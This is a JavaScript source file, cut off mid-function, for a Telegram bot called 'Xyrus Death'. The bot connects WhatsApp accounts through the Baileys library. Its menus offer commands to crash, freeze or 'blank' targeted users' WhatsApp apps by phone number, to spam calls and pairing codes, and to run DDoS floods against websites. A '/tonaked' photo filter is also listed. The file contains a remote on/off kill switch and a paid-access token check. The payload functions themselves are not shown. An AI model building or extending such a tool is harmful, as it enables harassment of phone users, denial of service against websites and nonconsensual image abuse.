const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReConnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisConnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const vm = require("vm");
const dotenv = require("dotenv");
const https = require("https");
const FormData = require("form-data");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "./assets/cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const OpenAI = require("openai");
const moment = require('moment');
const config = require("./settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ~ Thumbnail Vid
const vidthumbnail = "https://files.catbox.moe/k7f7xi.mp4";

// ~ Database Url
const databaseURL = "https://raw.githubusercontent.com/Ramzxhy/Database/main/token.json"

async function isTokenRegistered(token) {
    try {
        const response = await axios.get(databaseURL);
        const tokenData = response.data;

        if (!tokenData.tokens.includes(token)) {
            console.log(chalk.red("Xyrus Death — [ * ]\n❌ Your Bot Token Is Not Registered\n— Please Contact The Owner\n— @RAMZXHYNEWERA ( Telegram )"));
            process.exit(1); // Keluar dari script
        } else {
            console.log(chalk.cyan("Xyrus Death — [ ★ ]\n– Version : 6.0.0\n– Developer : RAMZXHYNEWERA \n– Telegram : @RAMZXHYNEWERA\n\nTelegram Bot Successfully Connected"));
        }
    } catch (error) {
        console.error("❌ Gagal mengambil data token:", error.message);
        process.exit(1);
    }
}


isTokenRegistered(BOT_TOKEN);

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ~ Control url
const CONTROL_URL = "https://raw.githubusercontent.com/Ramzxhy/ControlXyrus/refs/heads/main/Control.txt";
async function checkControlStatus() {
  try {
    const res = await axios.get(CONTROL_URL);
    const status = res.data.trim().toLowerCase();
    BOT_ACTIVE = status === "on";

    
  } catch (err) {
    console.log(chalk.red("⚠️ Gagal membaca control.txt"));
    BOT_ACTIVE = false;
  }
}
setInterval(checkControlStatus, 10 * 1000);
checkControlStatus();

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));

const USER_IDS_FILE = 'database/userids.json';

function readUserIds() {
    try {
        const data = fs.readFileSync(USER_IDS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Gagal membaca daftar ID pengguna:', error);
        return [];
    }
}


function saveUserIds(userIds) {
    try {
        fs.writeFileSync(USER_IDS_FILE, JSON.stringify(Array.from(userIds)), 'utf8');
    } catch (error) {
        console.error('Gagal menyimpan daftar ID pengguna:', error);
    }
}

const userIds = new Set(readUserIds());

function addUser(userId) {
    if (!userIds.has(userId)) {
        userIds.add(userId);
        saveUserIds(userIds);
        console.log(`Pengguna ${userId} ditambahkan.`);
    }
}

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
— Number : ${botNumber}.
— Status : Process
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
— Number : ${botNumber}.
— Status : Not Connected
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await ConnectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
— Number : ${botNumber}.
— Status : Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
— Number : ${botNumber}.
— Status : Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  let customcode = "RAMZXHYY"
  const code = await sock.requestPairingCode(botNumber, customcode);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
— Number : ${botNumber}.
— Code Pairing : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
— Number : ${botNumber}.
─ Status : Error ❌ ${error.message}
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// ~ Fungsional Function Before Parameters
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Get Speed Bots
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Premium ! - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}
 
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


/// --- ( Menu Utama ) --- \\\
const bugRequests = {};
const passwordUrl = "https://raw.githubusercontent.com/Ramzxhy/Password/refs/heads/main/password.json";

let tokenValidated = false;
let secureMode = false;

bot.on("message", async (msg) => {
  if (secureMode) return;
  
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @RAMZXHYNEWERA" ); 
    }
  const text = msg.text ? msg.text.trim() : "";

  if (!tokenValidated && !text.startsWith("/start")) {
    return bot.sendMessage(
      msg.chat.id,
      "🔒 Akses terkunci.\nKetik: `/start <password> <token>` untuk mengaktifkan bot.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/start(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const args = match[1] ? match[1].trim().split(/\s+/) : [];
  
  if (!tokenValidated) {
  
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @RAMZXHYNEWERA" ); 
    }
   
  // Harus ada dua argumen: password dan token
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "🔑 Masukkan password dan token Anda.\nFormat:\n`/start <password> <token>`",
      { parse_mode: "Markdown" }
    );
  }

  const [userPassword, userToken] = args;

  try {
    const resPass = await axios.get(passwordUrl);
    const botPassword = resPass.data.password; 

    // Cek password
    if (userPassword !== botPassword) {
      return bot.sendMessage(chatId, "❌ Password salah. Coba lagi.");
    }

    const resToken = await axios.get(databaseURL);
    const tokens = (resToken.data && resToken.data.tokens) || [];

    // Validasi token
    if (!tokens.includes(userToken) || userToken !== BOT_TOKEN) {
      return bot.sendMessage(chatId, "❌ Token tidak terdaftar, masukkan yang valid.");
    }

    tokenValidated = true;
    return bot.sendMessage(
      chatId,
      "🌺 Password & Tokens Valid, Mohon Ketik /start Kembali"
    );
  } catch (err) {
    console.error("Verifikasi gagal:", err);
    return bot.sendMessage(chatId, "❌ Gagal memverifikasi password/token.");
   }
 }

  // ---- Jika sudah verifikasi, jalankan animasi start seperti biasa ----
  const videoMsg = await bot.sendVideo(chatId, "https://files.catbox.moe/k7f7xi.mp4", {
    caption: "⚔️ 𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇 ⚔️",
    parse_mode: "HTML"
  });


  const bars = [
    '[█.........] 10%',
    '[██........] 20%',
    '[███.......] 30%',
    '[████......] 40%',
    '[█████.....] 50%',
    '[██████....] 60%',
    '[███████...] 70%',
    '[████████..] 80%',
    '[█████████.] 90%',
    '[██████████] 100%'
  ];

  for (const bar of bars) {
    await new Promise(r => setTimeout(r, 550));
    await bot.editMessageCaption(`MEMULAI PROSES — MOHON TUNGGU....\n${bar}`, {
      chat_id: chatId,
      message_id: videoMsg.message_id,
      parse_mode: "HTML"
    });
  }

  
  await new Promise(r => setTimeout(r, 800));


  try {
    await bot.deleteMessage(chatId, videoMsg.message_id);
  } catch (e) {
    console.error("Gagal hapus video loading:", e);
  }
  
  bot.sendVideo(chatId, vidthumbnail, {
caption: `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote><pre>⬡═―—⊱ ⎧ STATUS USER ⎭ ⊰―—═⬡</pre></blockquote>
✧ User ID   : <b>${senderId}</b>
✧ Username  : <b>${username}</b>
✧ Status : <b>${premiumStatus}</b>

<blockquote><pre>⬡═―—⊱ ⎧ SELECT THE BUTTON MENU ⎭ ⊰―—═⬡</pre></blockquote>
`,

    parse_mode: "HTML",
    reply_markup: {
     inline_keyboard: [
     [
      { text: "「🗡」Xyrus Attack", callback_data: "trashmenu" },
      { text: "「🛠」Tools Menu", callback_data: "toolsmenu" },
      { text: "「💣」Ddos Menu", callback_data: "Ddosmenu" }
    ],
    [ 
      { text: "「🧩」Group Menu", callback_data: "groupmenu" },
      { text: "「👑」Acces Menu", callback_data: "accesmenu" }
    ],
    [      
      { text: "「🍃」Thanks For", callback_data: "thanksto" }, 
    ], 
    [
      { text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }, 
       { text: "Informarion 𝐗𝐲𝐫𝐮𝐬", url: "https://t.me/Ramzxhych" }
    ]
  ]
 }
 });
   const audioPath = path.join(__dirname, "./assets/XyrusDeath.mp3");
  await bot.sendAudio(chatId, audioPath, {
    caption: `Ramz ☇ The Kink`,
    perfomer: `Ramz Sang Paduka`,
  });
});


bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.
<blockquote><pre>⬡═―—⊱ ⎧ DELAY INVISIBLE ⎭ ⊰―—═⬡</pre></blockquote>
✧ ./Matrixdelay - 62xx - Delay Hard Type Spam 3×
✧ ./Rosedelay - 62xx - Delay Sepong Quota
✧ ./Tenseidelay - 62xx - Delay Hard 500%
✧ ./Galaxydelay - 62xx - Delay Hard 1000%
✧ ./Smash - 62xx - Delay Blank Hard
✧ ./Impact - 62xx - Combo All Delay
<blockquote><pre>⬡═―—⊱ ⎧ BLANK ANDRO ⎭ ⊰―—═⬡</pre></blockquote>
✧ ./Xynus - 62xx - Blank Ui 1 Message
✧ ./Execute - 62xx - Blankk Spamm
✧ ./Exeplosion - 62xx - Combo All Blankk
✧ ./Bankai - 62xx - Blank Android 
<blockquote><pre>⬡═―—⊱ ⎧ CRASH ANDROID ⎭ ⊰―—═⬡</pre></blockquote>
✧ ./Excalibur - 62xx - Crash Android
✧ ./Good - 62xx - Crash High Tier
<blockquote><pre>⬡═―—⊱ ⎧ SPAMM MENU ⎭ ⊰―—═⬡</pre></blockquote>
✧ ./Oktagram - Spamm Call
✧ ./Overlow - Spam Pairing Code
<blockquote><pre>⬡═―—⊱ ⎧ TEST FUNCT ⎭ ⊰―—═⬡</pre></blockquote>
✧ ./testfunction - Reply funct
☇ Test funct

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "accesmenu") {
      caption = `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote><pre>⬡═―—⊱ ⎧ ACCES — MENU ⎭ ⊰―—═⬡</pre></blockquote>
ⵢ. /setcd ( Duration )
ⵢ. /addadmin ( ID )
ⵢ. /addprem ( ID ) 
ⵢ. /deladmin ( ID )
ⵢ. /delprem ( ID )
ⵢ. /connect ( Number )

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "Ddosmenu") {
      caption = `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote><b>⬡═―—⊱ ⎧ 『𝖢𝗈𝗇𝗍𝗋𝗈𝗅𝗌° - 𝖣𝖽𝗈𝗌』 ⎭ ⊰―—═⬡</b></blockquote>
ⵢ - /ddos - Attackin web 

<blockquote><b>⬡═―—⊱ ⎧ Metode Ddos ⎭ ⊰―—═⬡</b></blockquote>
ⵢ /pidoras
ⵢ /h2
ⵢ /h2vip
ⵢ /mix
ⵢ /strike
ⵢ /flood

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "groupmenu") {
      caption = `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote><pre>⬡═―—⊱ ⎧ GROUP — MENU ⎭ ⊰―—═⬡</pre></blockquote>
ⵢ. /kick - Kick anggota
ⵢ. /setrules - Buat aturan grup
ⵢ. /rules - Lihat aturan grup
ⵢ. /tagadmin - Tag semua admin
ⵢ. /admins - Daftar admin
ⵢ. /groupinfo - Info grup
ⵢ. /mute - Mute sementara
ⵢ. /unmute - Unmute pengguna/grup
ⵢ. /ban - Ban pengguna
ⵢ. /unban - Unban pengguna

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "toolsmenu") {
      caption = `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote> Tools — Menu </blockquote>
ⵢ. /update - Update File XyrushDeath.js
ⵢ. /iqc - SS chat ala iPhone
ⵢ. /brat - Buat stiker dari teks
ⵢ. /ig - Info akun Instagram
ⵢ. /maps - Info lokasi target
ⵢ. /duel - Tantang duel
ⵢ. /terima - Terima duel
ⵢ. /speed - Cek kecepatan bot
ⵢ. /cuaca - Info cuaca
ⵢ. /cekid - Cek ID pengguna
ⵢ. /whoami - Info data kamu
ⵢ. /antilink (on|off) - Anti-link grup
ⵢ. /getcode - Ambil kode
ⵢ. /panelinfo - Info panel

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`;
      replyMarkup = { 
inline_keyboard: [
[{ text: "「🛠」Tools V2", callback_data: "tools_next" }],
 [{ text: "Back - Menu !", callback_data: "back_to_main" }]
] 
};
}
    
    if (query.data === "tools_next") {
      caption = `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote> Tools — Menu V2 </blockquote>
ⵢ. /negarainfo - Info negara lengkap
ⵢ. /sticker - Ubah gambar jadi sticker
ⵢ. /beritaindo - Berita Indonesia terbaru
ⵢ. /logo - Buat logo dari teks
ⵢ. /pantun - Pantun random
ⵢ. /trending - Berita trending hari ini
ⵢ. /katahariini - Kata inspirasi hari ini
ⵢ. /motivasi - Motivasi random
ⵢ. /hariini - Tanggal & waktu sekarang
ⵢ. /faktaunik - Fakta unik random
ⵢ. /dunia - Berita internasional

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`;
      replyMarkup = { 
inline_keyboard: [
[{ text: "「🛠」Tools V3", callback_data: "tools_nextV3" }],
 [{ text: "Back - Tools !", callback_data: "toolsmenu" }]
] 
};
}
    
    if (query.data === "tools_nextV3") {
      caption = `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐆𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐆』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote> Tools — Menu V3 </blockquote>
ⵢ. /gempa - Info gempa terbaru
ⵢ. /chat - Chat developer
ⵢ. /instagramstalk - Lihat profil IG detail
ⵢ. /pinterest - Cari gambar Pinterest
ⵢ. /remini - Perbaiki kualitas foto
ⵢ. /tonaked - Filter pemrosesan foto (terbatas)
ⵢ. /nsfw - Mode konten sensitif

<blockquote> © zRAMZXHYNEWERA — The Xyrus Death</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Tools V2 !", callback_data: "tools_next" }]] };
    }
    
    if (query.data === "toolsmenu") {
      caption = `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote> Tools — Menu </blockquote>
ⵢ. /iqc - SS chat ala iPhone
ⵢ. /brat - Buat stiker dari teks
ⵢ. /ig - Info akun Instagram
ⵢ. /maps - Info lokasi target
ⵢ. /duel - Tantang duel
ⵢ. /terima - Terima duel
ⵢ. /speed - Cek kecepatan bot
ⵢ. /cuaca - Info cuaca
ⵢ. /cekid - Cek ID pengguna
ⵢ. /whoami - Info data kamu
ⵢ. /antilink (on|off) - Anti-link grup
ⵢ. /getcode - Ambil kode
ⵢ. /panelinfo - Info panel

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`;
      replyMarkup = { 
inline_keyboard: [
[{ text: "「🛠」Tools V2", callback_data: "tools_next" }],
 [{ text: "Back - Menu !", callback_data: "back_to_main" }]
] 
};
}

    if (query.data === "thanksto") {
      caption = `
<blockquote>Xyrus Death — RAMZXHYNEWERA [ 🍁 ]</blockquote>
—òlla ${username}, My name is @RAMZXHYNEWERA. I am the creator of this script. Please always support me so that this script runs smoothly. Thank you.

<blockquote><pre>⬡═―—⊱ ⎧ 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』⊰―—═⬡</pre></blockquote>
<b>✧. Bot Name : 『𝐗𝐘𝐑𝐔𝐒 𝐃𝐄𝐀𝐓𝐇』</b>
<b>✧. Author : @RAMZXHYNEWERA</b>
<b>✧. Version : 6.0.0</b>
<b>✧. Runtime : ${runtime}</b>

<blockquote><pre>⬡═―—⊱ ⎧ THANKS — TO ⎭ ⊰―—═⬡</pre></blockquote>
ⵢ. @RAMZXHYNEWERA  
☇ — Developer
ⵢ. @yannxbrut  
☇ — Mai Bess Prenn
ⵢ. @nnnbill  
☇ — Project

<blockquote> © RAMZXHYNEWERA — The Xyrus Deathr</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `
